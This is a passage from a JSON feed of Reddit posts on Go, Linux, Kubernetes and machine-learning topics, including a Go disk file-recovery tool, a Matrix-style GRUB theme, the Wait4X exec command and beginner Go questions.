support)","url":"https://www.reddit.com/r/golang/comments/1lk4eh2/digler_a_modular_file_carving_and_disk_analysis/","date":1750854698,"author":"/u/Affectionate-Wind144","guid":172068,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi all,</p> <p>I recently released the first version of <a href=\"https://github.com/ostafen/digler\">Digler</a> - a disk analysis and file recovery tool written entirely in Go, designed for recovering lost data from disk images or physical devices in a filesystem agnostic way.</p> <h1>How it works</h1> <p>Digler analyzes disk data sector-by-sector to carve out known file types even when metadata is lost. Think of it as alternative to photorec, but written in Go and designed with a modular architecture and an easy to use command line interface. Moreover, selective file recovery of files is possible by mounting the given image file via FUSE as a local filesystem using metadata contained in the DFXML report.</p> <h1>Features</h1> <ul> <li>File system agnostic: recovers files even without partition metadata</li> <li>Support for raw disk images and devices (e.g., .dd, .img, /dev/sdX, C:)</li> <li>Generates DFXML reports (Digital Forensics XML) for analysis and auditing</li> <li>Optionally mounts scan results as a FUSE filesystem (Linux)</li> <li>Clean CLI with subcommands for scanning, recovering, mounting, etc.</li> <li>Cross-platform and fast thanks to Go.</li> </ul> <h1>Supported formats</h1> <p>Example formats supported so far: PNG, JPEG, PDF, MP3, WAV, ZIP, and more — all implemented as modular scanners. New formats will come soon.</p> <p><a href=\"https://github.com/ostafen/digler/blob/main/assets/demo.gif\">Short Demo</a></p> <p>I&#39;d really appreciate any feedback on the project — whether it&#39;s about the design, code quality, or new features you&#39;d like to see.</p> <p>Contributions are welcome!</p> <p>Repo link: <a href=\"https://github.com/ostafen/digler\">https://github.com/ostafen/digler</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Affectionate-Wind144\"> /u/Affectionate-Wind144 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk4eh2/digler_a_modular_file_carving_and_disk_analysis/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk4eh2/digler_a_modular_file_carving_and_disk_analysis/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"All I'm offering is the truth... Red pill or blue pill? (Matrix-inspired GRUB theme)","url":"https://www.reddit.com/r/linux/comments/1lk43na/all_im_offering_is_the_truth_red_pill_or_blue/","date":1750853828,"author":"/u/Lazy_Medicine_2695","guid":170650,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>💊 So… I customized my GRUB bootloader to reflect <em>The Matrix</em> vibes — complete with a <strong>red pill / blue pill</strong> decision screen. The red pill boots into Linux (in my case, Arch), and the blue pill goes into Windows.</p> <p>I didn’t build this completely from scratch — this is a <strong>heavily customized version of the original</strong> <a href=\"https://github.com/shvchk/fallout-grub-theme\"><strong>Fallout GRUB theme</strong></a> by shvchk. Massive credit to them for the base work. I just reworked the visuals to fit a cleaner Matrix aesthetic and added my own flair to the boot menu layout.</p> <h1>🧠 Theme Features:</h1> <ul> <li>Matrix-inspired retro green-on-black aesthetic</li> <li>Custom background with minimal neon-styled colors</li> <li>Red pill = Linux / Blue pill = Windows</li> <li>Highlighted selection with glow</li> <li>No distracting splash or animation — just clean hacking vibes</li> </ul> <p>🔗 <strong>Theme Repo (Free to clone/fork/modify):</strong><br/> 👉 <a href=\"https://github.com/KartikHalkunde/Matrix-GRUB-theme\">github.com/KartikHalkunde/Matrix-GRUB-theme</a></p> <p>If you&#39;re into minimalist bootloaders that feel like you&#39;re jacking into something deep — this one&#39;s for you.</p> <p>Recorded using a phone (since it’s a real hardware GRUB screen, not a VM), so pardon the minor glare. I wanted to keep it real.</p> <p>🖥️ System Info:</p> <ul> <li>Arch Linux</li> <li>systemd</li> <li>SSD boot (~8 sec boot time)</li> <li>Customized GRUB theme with <code>theme.txt</code> and image tweaks</li> </ul> <p>💬 What do you think of the bootloader look? Would you boot into the Matrix with this setup? 😎</p> <p>Feedback and ideas for improvement are welcome. I’d love to evolve this further — maybe add more Matrix elements like scrolling glyphs later.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Lazy_Medicine_2695\"> /u/Lazy_Medicine_2695 </a> <br/> <span><a href=\"https://i.redd.it/7qn318o3f29f1.jpeg\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lk43na/all_im_offering_is_the_truth_red_pill_or_blue/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Pronunciation Of \"Gnome\"","url":"https://www.reddit.com/r/linux/comments/1lk3wv5/pronunciation_of_gnome/","date":1750853268,"author":"/u/Fast_Ad_3554","guid":172069,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I have been watching quite a few linux videos lately and just noticed that for some reason most people pronounce &quot;Gnome&quot; as GUH Gnome. Why? Gnome is already a known word? It is simply pronounced gnome. Where did this GUH gnome nonsense come from, and how does it make any sense? </p> <p>Should we start referring to cinnamon as CIN cinnamon or?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Fast_Ad_3554\"> /u/Fast_Ad_3554 </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1lk3wv5/pronunciation_of_gnome/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lk3wv5/pronunciation_of_gnome/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How we cut CKEditor's bundle size by 40%","url":"https://www.reddit.com/r/programming/comments/1lk3lhi/how_we_cut_ckeditors_bundle_size_by_40/","date":1750852312,"author":"/u/PiotrekKoszulinski","guid":170976,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/PiotrekKoszulinski\"> /u/PiotrekKoszulinski </a> <br/> <span><a href=\"https://ckeditor.com/blog/how-we-reduced-ckeditor-bundle-size/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lk3lhi/how_we_cut_ckeditors_bundle_size_by_40/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] ICCV 2025 Results Discussion","url":"https://www.reddit.com/r/MachineLearning/comments/1lk38sf/d_iccv_2025_results_discussion/","date":1750851190,"author":"/u/ElPelana","guid":170781,"unread":true,"content":"<p>Just created this thread for ICCV 2025 results discussion, which should be released today. Remember, scores go from 1 to 6.</p><p>I got a 4/4/2 initially, but I think I did a good rebuttal, so lets see :) Good luck everyone!!!</p>","contentLength":219,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Wait4X v3.4.0","url":"https://www.reddit.com/r/kubernetes/comments/1lk2nvt/wait4x_v340/","date":1750849268,"author":"/u/atkrad","guid":170615,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><h1>What is Wait4X?</h1> <p><a href=\"https://github.com/wait4x/wait4x\">Wait4X</a> is a lightweight, zero-dependency tool that helps you wait for services to be ready before your applications continue. Perfect for Kubernetes deployments, CI/CD pipelines, and container orchestration, it supports TCP, HTTP, DNS, databases (MySQL, PostgreSQL, MongoDB, Redis), and message queues (RabbitMQ, Temporal).</p> <h1>New Feature: exec Command</h1> <p>The highlight of <a href=\"https://github.com/wait4x/wait4x/releases/tag/v3.4.0\">v3.4.0</a> is the new exec command that allows you to wait for shell commands to succeed or return specific exit codes. This is particularly useful for Kubernetes readiness probes, init containers, and complex deployment scenarios where you need custom health checks beyond simple connectivity.</p> <h1>Kubernetes Use Cases:</h1> <ul> <li>Init Containers: wait4x exec &quot;kubectl wait --for=condition=ready pod/my-dependency&quot; - Wait for dependent pods</li> <li>Database Migrations: wait4x exec &quot;python <a href=\"http://manage.py\">manage.py</a> migrate --check&quot; - Wait for migrations</li> <li>File System Checks: wait4x exec &quot;ls /shared/config.yaml&quot; - Wait for config files</li> </ul> <p>The command supports all existing features like timeouts, exponential backoff, and parallel execution, making it ideal for Kubernetes environments where you need to ensure all dependencies are ready before starting your application.</p> <p><strong>Note:</strong> I&#39;m a maintainer of this open-source project. This post focuses on the technical value and Kubernetes use cases rather than promoting the tool itself.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/atkrad\"> /u/atkrad </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk2nvt/wait4x_v340/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk2nvt/wait4x_v340/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Literature about crafting an interpreter","url":"https://www.reddit.com/r/golang/comments/1lk2kr0/literature_about_crafting_an_interpreter/","date":1750848982,"author":"/u/javierrsantoss","guid":171011,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi there guys!</p> <p>I&#39;m interested in reading a book about writing an interpreter, just for learning purposes. I saw <a href=\"https://craftinginterpreters.com/\">Crafting Interpreters</a> by Robert Nystrom and <a href=\"https://interpreterbook.com/\">Writing An Interpreter In Go</a> by Thorsten Ball. I know the basics of Go and I&#39;ve coded small projects with it. </p> <p>I don&#39;t know if Go is the best programming lang for building an interpreter but I think is a good trade-off between simplicity and efficiency for this task. That&#39;s the reason to buy and use the second book.</p> <p>Did anyone of you read any of them? What&#39;s your thoughts on this?</p> <p>Thank you!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/javierrsantoss\"> /u/javierrsantoss </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk2kr0/literature_about_crafting_an_interpreter/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk2kr0/literature_about_crafting_an_interpreter/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OpenAI is Ditching TypeScript to Rebuild Codex CLI with Rust","url":"https://www.reddit.com/r/programming/comments/1lk2fng/openai_is_ditching_typescript_to_rebuild_codex/","date":1750848500,"author":"/u/Soul_Predator","guid":170649,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>OpenAI is retiring the TypeScript Codex CLI. Anyone tried the &#39;butter smooth&#39; Rust version?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Soul_Predator\"> /u/Soul_Predator </a> <br/> <span><a href=\"https://analyticsindiamag.com/global-tech/openai-is-ditching-typescript-to-rebuild-codex-cli-with-rust/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lk2fng/openai_is_ditching_typescript_to_rebuild_codex/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"🚀 Wait4X v3.4.0: Introducing the exec Command","url":"https://www.reddit.com/r/golang/comments/1lk2em2/wait4x_v340_introducing_the_exec_command/","date":1750848393,"author":"/u/atkrad","guid":170579,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><h1>What is Wait4X?</h1> <p><a href=\"https://github.com/wait4x/wait4x\">Wait4X</a> is a lightweight, zero-dependency tool that helps you wait for services to be ready before your applications continue. Perfect for CI/CD pipelines, containers, deployments, and local development, it supports TCP, HTTP, DNS, databases (MySQL, PostgreSQL, MongoDB, Redis), and message queues (RabbitMQ, Temporal).</p> <h1>New Feature: exec Command</h1> <p>The highlight of <a href=\"https://github.com/wait4x/wait4x/releases/tag/v3.4.0\">v3.4.0</a> is the new exec command that allows you to wait for shell commands to succeed or return specific exit codes. This opens up flexible health checks beyond just network services - you can now wait for build processes, file existence, custom scripts, or any command-based condition.</p> <h1>Examples:</h1> <ul> <li>wait4x exec &quot;ls /nonexistent&quot; --exit-code 2 - Wait for specific failure</li> <li>wait4x exec &#39;ping <a href=\"http://wait4x.dev\">wait4x.dev</a> -c 2&#39; - Network connectivity check</li> <li>wait4x exec &quot;bash ./some-script.sh&quot; --timeout 120s - Custom script execution</li> </ul> <p>The command supports all existing features like timeouts, exponential back-off, and parallel execution, making it perfect for complex deployment scenarios where you need to wait for custom conditions before proceeding.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/atkrad\"> /u/atkrad </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk2em2/wait4x_v340_introducing_the_exec_command/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk2em2/wait4x_v340_introducing_the_exec_command/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Declaration order has matter?","url":"https://www.reddit.com/r/golang/comments/1lk26ha/declaration_order_has_matter/","date":1750847615,"author":"/u/pepiks","guid":170736,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>A lot of times in programming I find that code runned should be first definied above and before place where it is executed:</p> <p><code>func showGopher {}</code></p> <p><code>func main() {</code></p> <p><code>showGopher()</code></p> <p><code>}</code></p> <p>At some code I see one is below used, other time is on other file which only share the same name of package - so the real order is confusing. Declaring things below main function to use it in main function it has matter or it is only question about how is easier to read?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/pepiks\"> /u/pepiks </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk26ha/declaration_order_has_matter/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk26ha/declaration_order_has_matter/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Good practics for named function return","url":"https://www.reddit.com/r/golang/comments/1lk216h/good_practics_for_named_function_return/","date":1750847111,"author":"/u/pepiks","guid":171891,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>After reading article:</p> <p><a href=\"https://golang.ntxm.org/docs/functions-in-go/named-return-values/\">https://golang.ntxm.org/docs/functions-in-go/named-return-values/</a></p> <p>I found out confusing code:</p> <p><code>package main</code> </p> <p><code>import &quot;fmt&quot;</code> </p> <p><code>func convertTemperature(celsius float64) (fahrenheit, kelvin float64) {</code><br/> <code>fahrenheit = celsius*9/5 + 32</code><br/> <code>kelvin = celsius + 273.15</code><br/> <code>return</code><br/> <code>}</code> </p> <p><code>func main() {</code><br/> <code>f, k := convertTemperature(100)</code><br/> <code>fmt.Printf(&quot;100°C is %.2f°F and %.2fK\\n&quot;, f, k)</code><br/> <code>}</code></p> <p>I previously think that return in example above will get me nil value as nothing is returned, but is opposite. At declaration I see what is returned, but I don&#39;t see it at return. This kind of return is consider as good or bad practise?</p> <p>For me it should be only correct:</p> <p><code>func convertTemperature(celsius float64) (fahrenheit, kelvin float64) {</code><br/> <code>fahrenheit = celsius*9/5 + 32</code><br/> <code>kelvin = celsius + 273.15</code><br/> <code>return fahrenheit, kelvin</code><br/> <code>}</code></p> <p>as reading from top to bottom we can read what is returned, because without this I have to jump to top to check what is it. So then what is the Go way for this kind of stuff? When this kind return use and when avoid?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/pepiks\"> /u/pepiks </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk216h/good_practics_for_named_function_return/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk216h/good_practics_for_named_function_return/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null}],"tags":["reddit"]}